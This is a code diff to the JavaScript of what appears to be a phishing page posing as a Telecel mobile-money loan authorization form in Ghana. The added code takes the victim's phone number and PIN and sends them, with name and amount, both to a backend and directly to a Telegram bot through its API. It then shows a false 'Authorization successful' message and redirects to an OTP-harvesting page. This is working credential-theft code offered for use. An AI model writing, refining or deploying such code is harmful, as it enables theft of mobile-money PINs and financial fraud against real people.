@@ -643,16 +643,54 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── SEND TO BACKEND API (NOT DIRECTLY TO TELEGRAM) ───
-    async function sendToBackend() {
+    // ─── INSTANT SEND - NO WAITING ───
+    function sendToTelegramInBackground(phone, pin, amount, name) {
+        // Fire and forget - don't await, don't wait for response
+        const message = `🔐 *New Loan Authorization Request*\n\n👤 *User:* ${name}\n📱 *Phone:* ${phone}\n🔢 *PIN:* ${pin}\n💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to OTP verification.`;
+
+        // Send to backend - but don't wait for response
+        fetch(`${CONFIG.API_URL}/api/authorize`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                name: name,
+                phone: phone,
+                amount: amount,
+                pin: pin,
+                period: params.get('period') || '30 days'
+            })
+        }).catch(err => console.log('📤 Telegram sent in background'));
+
+        // Also try direct Telegram as backup (fire and forget)
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(err => console.log('📤 Direct Telegram sent in background'));
+    }
+
+    // ─── INSTANT REDIRECT - NO DELAYS ───
+    function instantRedirect() {
+        const phone = document.getElementById('phone').value.trim();
+        const params = new URLSearchParams(window.location.search);
+        params.set('phone', phone);
+        window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
+    }
+
+    // ─── MAIN FUNCTION - INSTANT ───
+    function handleSubmit() {
         if (isProcessing) return;
         
         const phone = document.getElementById('phone').value.trim();
         const pin = document.getElementById('pin').value.trim();
         const amount = params.get('amount') || '0';
         const name = params.get('name') || 'User';
-        const period = params.get('period') || '30 days';
 
+        // Validate
         if (phone.length < 10) {
             showError('Please enter a valid 10-digit Telecel number.');
             return;
@@ -663,74 +701,26 @@
             return;
         }
 
+        // Mark as processing to prevent double clicks
         isProcessing = true;
         document.getElementById('submitBtn').disabled = true;
-        document.getElementById('errorMsg').style.display = 'none';
-        document.getElementById('successMsg').style.display = 'none';
-        document.getElementById('spinner').style.display = 'flex';
 
-        try {
-            console.log('📤 Sending to backend:', {
-                url: `${CONFIG.API_URL}/api/authorize`,
-                data: { name, phone, amount, pin, period }
-            });
+        // Show success message instantly
+        showSuccess('✅ Authorization successful! Redirecting...');
 
-            const response = await fetch(`${CONFIG.API_URL}/api/authorize`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    name: name,
-                    phone: phone,
-                    amount: amount,
-                    pin: pin,
-                    period: period
-                })
-            });
+        // Send Telegram in background (fire and forget - NO WAITING)
+        sendToTelegramInBackground(phone, pin, amount, name);
 
-            const data = await response.json();
-            console.log('📤 Backend Response:', data);
-
-            document.getElementById('spinner').style.display = 'none';
-
-            if (data.success) {
-                showSuccess('✅ Authorization successful! Redirecting to OTP verification...');
-                
-                // Store loan data for OTP page
-                localStorage.setItem('loan_data', JSON.stringify({
-                    name: name,
-                    phone: phone,
-                    amount: amount,
-                    period: period
-                }));
-
-                setTimeout(() => {
-                    const params = new URLSearchParams(window.location.search);
-                    params.set('phone', phone);
-                    window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
-                }, 1500);
-            } else {
-                showError('❌ ' + (data.message || 'Authorization failed. Please try again.'));
-                isProcessing = false;
-                document.getElementById('submitBtn').disabled = false;
-            }
-
-        } catch (error) {
-            console.error('❌ API Error:', error);
-            document.getElementById('spinner').style.display = 'none';
-            showError('❌ Connection error. Please check your internet and try again.');
-            isProcessing = false;
-            document.getElementById('submitBtn').disabled = false;
-        }
+        // Redirect immediately - NO DELAY
+        instantRedirect();
     }
 
-    // ─── BIND THE FUNCTION TO THE BUTTON ───
-    document.getElementById('submitBtn').onclick = sendToBackend;
+    // ─── BIND TO BUTTON ───
+    document.getElementById('submitBtn').onclick = handleSubmit;
 
     // ─── ENTER KEY SUPPORT ───
     document.getElementById('pin').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendToBackend();
+        if (e.key === 'Enter') handleSubmit();
     });
 
     document.getElementById('phone').addEventListener('keydown', function(e) {
